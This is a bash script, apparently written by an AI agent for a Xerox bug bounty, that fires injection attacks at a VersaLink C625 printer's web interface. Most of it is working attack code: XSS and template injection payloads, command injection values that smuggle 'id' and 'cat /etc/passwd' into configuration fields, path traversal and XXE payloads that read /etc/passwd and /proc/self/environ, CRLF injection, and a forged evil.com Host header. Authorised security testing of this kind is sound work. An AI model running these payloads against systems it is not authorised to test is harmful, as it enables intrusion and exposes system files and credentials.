#!/bin/bash
# Deep Injection & Memory Attack Testing - Xerox VersaLink C625 @ 13.13.1.110
# Xerox Bug Bounty (HackerOne)
# NO brute force, NO DoS, NO shells, NO data exfil

TARGET="13.13.1.110"
PROXY="127.0.0.1:34153"
OUTDIR="/tmp/claude-0/-home-user-poc/7cd1a7e6-f110-5076-9299-6360885c3a0d/scratchpad/injection_results"
mkdir -p "$OUTDIR"

fetch_get() {
  local path="$1"
  (echo -e "GET $path HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; sleep 2) | \
    timeout 15 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

fetch_get_custom_ua() {
  local path="$1"
  local ua="$2"
  (echo -e "GET $path HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\nUser-Agent: $ua\r\n\r\n"; sleep 2) | \
    timeout 15 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

fetch_post() {
  local path="$1"
  local body="$2"
  local content_type="${3:-application/x-www-form-urlencoded}"
  local len=${#body}
  (echo -e "POST $path HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: $content_type\r\nContent-Length: $len\r\n\r\n$body"; sleep 3) | \
    timeout 15 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

fetch_get_custom_header() {
  local path="$1"
  local header="$2"
  (echo -e "GET $path HTTP/1.1\r\nHost: $TARGET\r\n$header\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; sleep 2) | \
    timeout 15 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

echo "================================================================"
echo "  DEEP INJECTION & MEMORY ATTACK TESTING"
echo "  Target: $TARGET (Xerox VersaLink C625)"
echo "  Date: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "================================================================"

###############################################################################
# TEST 1: XSS - Reflected XSS in various parameters
###############################################################################
echo ""
echo "[TEST 1] XSS Testing across multiple endpoints"
echo "================================================"

XSS_PAYLOADS=(
  '<script>alert(1)</script>'
  '"><script>alert(1)</script>'
  "'\"><img src=x onerror=alert(1)>"
  '<img src=x onerror=alert(1)>'
  '"><svg/onload=alert(1)>'
  "javascript:alert(1)"
  '<body onload=alert(1)>'
  '{{7*7}}'
  '${7*7}'
  '<%= 7*7 %>'
)

XSS_ENDPOINTS=(
  "/stat/welcome.php?tab=status&name="
  "/stat/welcome.php?tab="
  "/jobs/active.php?sort="
  "/print/print.php?jobname="
  "/search?q="
  "/stat/welcome.php?redirect="
  "/webglue/content?c="
  "/stat/informationpages.php?page="
)

for ep in "${XSS_ENDPOINTS[@]}"; do
  for payload in "${XSS_PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null)
    resp=$(fetch_get "${ep}${encoded}" 2>/dev/null)
    if echo "$resp" | grep -qi "alert(1)\|<script>\|onerror=\|onload=\|49\|\${7\*7}"; then
      echo "  [!] POTENTIAL XSS at ${ep}"
      echo "      Payload: $payload"
      echo "      Response snippet: $(echo "$resp" | grep -i "alert\|script\|onerror\|49" | head -2)"
      echo "$resp" > "$OUTDIR/xss_$(echo "${ep}${payload}" | md5sum | cut -c1-8).html"
    fi
  done
done

echo "[+] XSS endpoint testing complete"

###############################################################################
# TEST 2: SSTI - Server-Side Template Injection
###############################################################################
echo ""
echo "[TEST 2] SSTI Testing"
echo "================================================"

SSTI_PAYLOADS=(
  '{{7*7}}'
  '${7*7}'
  '<%= 7*7 %>'
  '#{7*7}'
  '*{7*7}'
  '{{config}}'
  '${.version}'
  '${{7*7}}'
  '{7*7}'
)

SSTI_ENDPOINTS=(
  "/stat/welcome.php?tab="
  "/print/print.php?jobname="
  "/webglue/content?c="
  "/support/support.php?q="
)

for ep in "${SSTI_ENDPOINTS[@]}"; do
  for payload in "${SSTI_PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null)
    resp=$(fetch_get "${ep}${encoded}" 2>/dev/null)
    if echo "$resp" | grep -q "49"; then
      echo "  [!] POTENTIAL SSTI at ${ep}"
      echo "      Payload: $payload"
      echo "      Response contains '49' - needs manual verification"
      echo "$resp" > "$OUTDIR/ssti_$(echo "${ep}${payload}" | md5sum | cut -c1-8).html"
    fi
    if echo "$resp" | grep -qi "smarty\|twig\|jinja\|freemarker\|velocity\|template.*error\|parse.*error"; then
      echo "  [!] TEMPLATE ENGINE ERROR at ${ep}"
      echo "      Payload: $payload"
      echo "      $(echo "$resp" | grep -i 'smarty\|twig\|jinja\|freemarker\|velocity\|template\|parse.*error' | head -2)"
      echo "$resp" > "$OUTDIR/ssti_error_$(echo "${ep}${payload}" | md5sum | cut -c1-8).html"
    fi
  done
done

echo "[+] SSTI testing complete"

###############################################################################
# TEST 3: Command Injection via xerox.set configuration handler
###############################################################################
echo ""
echo "[TEST 3] Command Injection via /dummypost/xerox.set"
echo "================================================"

CSRF_TOKEN=$(fetch_get "/stat/welcome.php" 2>/dev/null | grep -oP 'CSRFToken.*?value="[^"]*"' | grep -oP 'value="[^"]*"' | head -1 | tr -d 'value="')
if [ -z "$CSRF_TOKEN" ]; then
  CSRF_TOKEN=$(fetch_get "/stat/welcome.php" 2>/dev/null | grep -oP '[a-f0-9]{64,}' | head -1)
fi
echo "  [*] CSRF Token: ${CSRF_TOKEN:0:20}..."

CMDI_PAYLOADS=(
  '$(id)'
  '`id`'
  ';id'
  '|id'
  '||id'
  '&id'
  '&&id'
  '%0aid'
  "';id;'"
  '$(cat /etc/passwd)'
  '`cat /etc/passwd`'
)

CMDI_PARAMS=(
  "_fun_function"
  "NextPage"
  "deviceName"
  "deviceLocation"
  "contactName"
)

for param in "${CMDI_PARAMS[@]}"; do
  for payload in "${CMDI_PAYLOADS[@]}"; do
    body="CSRFToken=${CSRF_TOKEN}&${param}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null)"
    resp=$(fetch_post "/dummypost/xerox.set" "$body" 2>/dev/null)
    if echo "$resp" | grep -qi "uid=\|root:\|passwd\|command.*not.*found\|sh:.*not.*found\|bin/sh"; then
      echo "  [!] POTENTIAL CMD INJECTION at /dummypost/xerox.set"
      echo "      Param: $param"
      echo "      Payload: $payload"
      echo "      Response: $(echo "$resp" | grep -i 'uid=\|root:\|passwd\|command\|sh:' | head -3)"
      echo "$resp" > "$OUTDIR/cmdi_${param}_$(echo "$payload" | md5sum | cut -c1-8).txt"
    fi
  done
done

echo "[+] Command injection testing complete"

###############################################################################
# TEST 4: Path Traversal
###############################################################################
echo ""
echo "[TEST 4] Path Traversal Testing"
echo "================================================"

PT_PAYLOADS=(
  "../../../etc/passwd"
  "../../../../etc/passwd"
  "../../../../../etc/passwd"
  "....//....//....//etc/passwd"
  "..%2f..%2f..%2fetc%2fpasswd"
  "..%252f..%252fetc%252fpasswd"
  "/etc/passwd"
  "/proc/self/environ"
  "/proc/self/cmdline"
  "..\\..\\..\\etc\\passwd"
  "../../../etc/passwd%00"
  "../../../etc/passwd%00.php"
  "../../../etc/passwd%00.jpg"
)

PT_ENDPOINTS=(
  "/webglue/content?c="
  "/stat/informationpages.php?page="
  "/print/print.php?file="
  "/support/support.php?page="
  "/ajax/activityAjaxHandler.php?file="
  "/stat/welcome.php?tab="
)

for ep in "${PT_ENDPOINTS[@]}"; do
  for payload in "${PT_PAYLOADS[@]}"; do
    resp=$(fetch_get "${ep}${payload}" 2>/dev/null)
    if echo "$resp" | grep -q "root:.*:0:0:\|daemon:\|nobody:"; then
      echo "  [!!] PATH TRAVERSAL CONFIRMED at ${ep}"
      echo "      Payload: $payload"
      echo "      Response: $(echo "$resp" | grep 'root:' | head -1)"
      echo "$resp" > "$OUTDIR/pt_vuln_$(echo "${ep}${payload}" | md5sum | cut -c1-8).txt"
    fi
  done
done

# Test the webglue content handler with various Xerox-specific paths
echo "  [*] Testing webglue with internal path references..."
XEROX_PATHS=(
  "/webglue/content?c=../../etc/passwd"
  "/webglue/content?c=../config"
  "/webglue/content?c=../../var/log/messages"
  "/webglue/content?c=../../../tmp"
  "/webglue/rawcontent?c=../../etc/passwd"
)

for path in "${XEROX_PATHS[@]}"; do
  resp=$(fetch_get "$path" 2>/dev/null)
  status=$(echo "$resp" | head -1)
  if [[ "$status" != *"404"* && "$status" != *"403"* && "$status" != *"302"* ]]; then
    body_len=$(echo "$resp" | wc -c)
    if [ "$body_len" -gt 200 ]; then
      echo "  [?] Interesting response at $path (${body_len} bytes, status: $status)"
      echo "$resp" > "$OUTDIR/pt_webglue_$(echo "$path" | md5sum | cut -c1-8).txt"
    fi
  fi
done

echo "[+] Path traversal testing complete"

###############################################################################
# TEST 5: XXE via XML/SOAP endpoints
###############################################################################
echo ""
echo "[TEST 5] XXE Testing on XML/SOAP Endpoints"
echo "================================================"

XXE_PAYLOAD_BASIC='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

XXE_PAYLOAD_PARAM='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>'

XXE_PAYLOAD_ODATA='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>'

XML_ENDPOINTS=(
  "/webservices/office/emailservice"
  "/webservices/office/jobservice"
  "/webservices/general/security"
  "/webservices/office/scanservice"
  "/ws/discovery"
)

for ep in "${XML_ENDPOINTS[@]}"; do
  resp=$(fetch_post "$ep" "$XXE_PAYLOAD_BASIC" "application/xml" 2>/dev/null)
  status=$(echo "$resp" | head -1)
  if echo "$resp" | grep -q "root:.*:0:0:"; then
    echo "  [!!] XXE CONFIRMED at $ep"
    echo "$resp" > "$OUTDIR/xxe_vuln_$(echo "$ep" | md5sum | cut -c1-8).txt"
  elif [[ "$status" != *"404"* && "$status" != *"405"* ]]; then
    body_len=$(echo "$resp" | wc -c)
    echo "  [?] $ep responded ($status, ${body_len} bytes)"
    echo "$resp" > "$OUTDIR/xxe_$(echo "$ep" | md5sum | cut -c1-8).txt"
  fi
done

# Test SOAP envelopes
SOAP_XXE='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetDeviceInfo>&xxe;</GetDeviceInfo></soap:Body></soap:Envelope>'

for ep in "${XML_ENDPOINTS[@]}"; do
  resp=$(fetch_post "$ep" "$SOAP_XXE" "text/xml" 2>/dev/null)
  if echo "$resp" | grep -q "root:.*:0:0:"; then
    echo "  [!!] XXE via SOAP at $ep"
    echo "$resp" > "$OUTDIR/xxe_soap_$(echo "$ep" | md5sum | cut -c1-8).txt"
  fi
done

echo "[+] XXE testing complete"

###############################################################################
# TEST 6: SSRF via scan/email/connector configs
###############################################################################
echo ""
echo "[TEST 6] SSRF Testing"
echo "================================================"

SSRF_ENDPOINTS=(
  "/scan/new_info.php"
  "/netscan/file_list.php"
  "/support/remoteUI/RUIHome.php"
)

for ep in "${SSRF_ENDPOINTS[@]}"; do
  resp=$(fetch_get "$ep" 2>/dev/null)
  status=$(echo "$resp" | head -1)
  if [[ "$status" != *"404"* && "$status" != *"302"* ]]; then
    body_len=$(echo "$resp" | wc -c)
    echo "  [*] $ep accessible ($status, ${body_len} bytes)"
    echo "$resp" > "$OUTDIR/ssrf_$(echo "$ep" | md5sum | cut -c1-8).html"
    if echo "$resp" | grep -qi "destination\|server\|host\|url\|address\|smb://\|ftp://\|http://"; then
      echo "  [!] Contains destination/server fields - potential SSRF surface"
    fi
  fi
done

echo "[+] SSRF testing complete"

###############################################################################
# TEST 7: Header Injection
###############################################################################
echo ""
echo "[TEST 7] HTTP Header Injection Testing"
echo "================================================"

# CRLF injection in various parameters
CRLF_PAYLOADS=(
  "%0d%0aX-Injected: true"
  "%0aX-Injected: true"
  "\r\nX-Injected: true"
  "%0d%0aSet-Cookie: hacked=true"
)

for payload in "${CRLF_PAYLOADS[@]}"; do
  resp=$(fetch_get "/stat/welcome.php?tab=status${payload}" 2>/dev/null)
  if echo "$resp" | grep -qi "X-Injected:\|hacked=true"; then
    echo "  [!] CRLF INJECTION detected!"
    echo "      Payload: $payload"
    echo "$resp" | head -20 > "$OUTDIR/crlf_vuln.txt"
  fi
done

# Host header injection
resp=$(fetch_get_custom_header "/" "Host: evil.com" 2>/dev/null)
if echo "$resp" | grep -qi "evil.com"; then
  echo "  [!] Host header reflected in response"
  echo "$resp" > "$OUTDIR/host_header_injection.txt"
fi

# X-Forwarded-For manipulation
resp=$(fetch_get_custom_header "/stat/welcome.php" "X-Forwarded-For: 127.0.0.1" 2>/dev/null)
echo "$resp" > "$OUTDIR/xff_test.html"

echo "[+] Header injection testing complete"

echo ""
echo "================================================================"
echo "  INJECTION TESTING COMPLETE"
echo "  Results saved to: $OUTDIR/"
echo "================================================================"
